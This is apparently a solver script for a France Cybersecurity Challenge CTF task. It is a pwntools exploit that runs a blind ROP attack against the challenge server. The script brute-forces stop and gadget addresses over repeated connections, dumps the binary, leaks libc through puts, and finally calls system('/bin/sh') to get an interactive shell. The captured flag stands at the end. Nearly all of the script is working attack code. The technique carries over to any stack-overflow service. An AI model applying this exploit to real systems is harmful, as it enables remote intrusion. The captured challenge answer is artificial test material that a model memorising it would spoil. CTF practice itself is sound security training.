#!/usr/bin/env python3

# nc challenges2.france-cybersecurity-challenge.fr 4008
# https://www.dailysecurity.fr/blind-rop-arm-securevault-writeup
# https://blog.acolyer.org/2016/06/22/hacking-blind
# https://0xswitch.fr/CTF/ecw-2020-pwn-zatoishi
# https://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop/#blind-rop

from pwn import *
from Crypto.Util.number import bytes_to_long
import os

def leakAddr():
    c = b'a'
    pld = c * 8 # starts with 0x7f and ends with a37 -> 0x7f2fd6d2ca37 - libc
    pld = c * 24 # starts with 0x7ff and end with 0 -> 0x7fff753ff490 - stack
    pld = c * 32 # starts with 0x7ff and end with 0 -> 0x7ffc1b9b1330 - stack
    pld = c * 40 # addr = 0x4006cc

    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
    r.recv(timeout=0.1)
    r.send(pld)
    leaks = r.recv(timeout=0.1).split()

    bye = leaks[-1][leaks[-1].rfind(c) + 1:-4][::-1]
    l = []
    for i in range(0, len(bye), 6):
        l.append(bytes_to_long(bye[i:i + 6]))
    return l[0]

def getStopGadget(leak):
    L = []
    start = 0x500
    end = start + 0x300
    for i in range(start, end):
        context.log_level='error'
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
        context.log_level='info'
        try:
            addr = base_addr + i
            log.info(f'GetStopGadget -> trying addr = {hex(addr)}')
            pld = b'c' * 40
            pld += p64(addr)
            r.recv(timeout=0.1)
            r.send(pld)
            res = r.recv(timeout=0.1)
            if ref in res:
                L.append(addr)
        except:
            pass
        context.log_level='error'
        r.close()
        context.log_level='info'
    return L

def getBropGadget(stop_gadget, false_positives):
    start = 0
    end = start + 0x1000
    L = []
    for i in range(start, end):
        context.log_level='error'
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
        context.log_level='info'
        try:
            addr = base_addr + i
            log.info(f'getBropGadget -> trying addr = {hex(addr)}')
            pld = b'c' * 40
            pld += p64(addr)
            pld += p64(0) * 6
            pld += p64(stop_gadget)
            r.recv(timeout=0.1)
            r.send(pld)
            res = r.recv(timeout=0.1)
            if ref in res:
                if addr not in false_positives:
                    L.append(addr)
                    #return addr
        except:
            pass
        context.log_level='error'
        r.close()
        context.log_level='info'
    print([hex(i) for i in L])
    return L

def getPutsAddr(stop_gadget, pop_rdi):
    start = 0x0
    end = start + 0x1000
    for i in range(start, end):
        context.log_level='error'
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
        context.log_level='info'
        try:
            addr = 0x400000 + i
            log.info(f'getPutsAddr({hex(stop_gadget)}, {hex(pop_rdi)} -> trying addr = {hex(addr)}')
            pld = b'c' * 40
            pld += p64(pop_rdi)
            pld += p64(pop_rdi) # puts arg = '\x5f\xc3'
            pld += p64(addr)
            pld += p64(stop_gadget) # stop gadget
            r.recv(timeout=0.1)
            r.send(pld)
            res = r.recv(timeout=0.1)
            if b'\x5f' in res:
                print(list(res))
                return addr
                break
        except:
            pass
        context.log_level='error'
        r.close()
        context.log_level='info'
    return None

def leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget):
    context.log_level='error'
    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
    context.log_level='info'
    log.info(f'leakAddr({hex(leak_addr)})')
    pld = b'a' * 40
    pld += p64(pop_rdi) + p64(leak_addr)
    pld += p64(puts_plt)
    pld += p64(stop_gadget)
    r.recv(timeout=0.1)
    r.send(pld)
    rec = r.recv()
    data = b'\x00'
    try:
        data = rec[rec.index(b'@')+1:rec.index(b'\n' + ref)]
    except:
        pass
    context.log_level='error'
    r.close()
    context.log_level='info'
    return data if data else b'\x00'

ref = b'Hello you.\nWhat is your name ?\n>>> '
base_addr = 0x400000

#leak = leakAddr()
leak = 0x4006cc
log.success(f'leaked addr = {hex(leak)}')

#stop_gadgets = getStopGadget(leak) # generate a list of false positives
#stop_gadget = stop_gadgets[0]
stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
stop_gadget = 0x400560
log.success(f'stop_gadget = {hex(stop_gadget)}')
log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')

#brop_gadgets = getBropGadget(stop_gadget, stop_gadgets)
brop_gadgets = [0x4005ee, 0x40073a]
log.success(f'brop_gadgets = {[hex(i) for i in brop_gadgets]}')

#for brop_gadget in brop_gadgets:
#    brop_gadget += 0x9
#    log.info(f'trying brop_gadget = {hex(brop_gadget)}')
#    puts_addr = getPutsAddr(stop_gadget, brop_gadget)
#    if puts_addr:
#        log.success(f'brop_gadget = {hex(brop_gadget)}')
#        log.success(f'puts_addr = {hex(puts_addr)}')
#        break
pop_rdi = 0x400743
puts_plt = 0x4004f5
log.success(f'pop_rdi = {hex(pop_rdi)}')
log.success(f'puts_plt = {hex(puts_plt)}')

# lets dump the whole binary from 0x400000 too 0x401000
#binary = b''
#leak_addr = base_addr
#while leak_addr < base_addr + 0x1000:
#    data = leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget)
#    leak_addr += len(data)
#    binary += data
#f = open('binary', 'wb')
#f.write(binary)
#f.close()

# ghidra as binary -> rebase then dissas -> find puts
# entry point at 0x400550
# qword ptr [DAT_00600fc8]
puts_got = 0x600fc8
vuln = 0x400656
main = 0x4006b4
log.success(f'puts_got = {hex(puts_got)}')
log.success(f'vuln = {hex(vuln)}')
log.success(f'main = {hex(main)}')

# lets leak the libc
r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)

pld = b'a' * 40
pld += p64(pop_rdi) + p64(puts_got)
pld += p64(puts_plt)
pld += p64(main)

r.recv(timeout=0.1)
r.send(pld)
rec = r.recv()
libc_leak = bytes_to_long(rec[rec.index(b'@')+1:rec.index(b'\n' + ref)][::-1])
log.success(f'libc_leak = {hex(libc_leak)}')

libc = ELF('src/libc6_2.19-18_deb8u10_amd64.so')
libc_base = libc_leak - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

pld = b'a' * 40
pld += p64(pop_rdi) + p64(binsh)
pld += p64(system)
pld += p64(stop_gadget)

r.send(pld)
r.interactive()
r.close()

'''
its x64 binary
39 = 0x4006cc
buff[8]
on overwrite last byte et printf("%s") -> read jusqu'au \x00
donc on dump ce que ya derriere le buffer

def test():
    try:
        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
        r.recv(timeout=0.1)
        pld = b'c' * 40
        pld += p64(0x40073b)
        r.send(pld)
        print(r.recv(timeout=0.1))
    except:
        print('fail')
        pass
'''

# FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
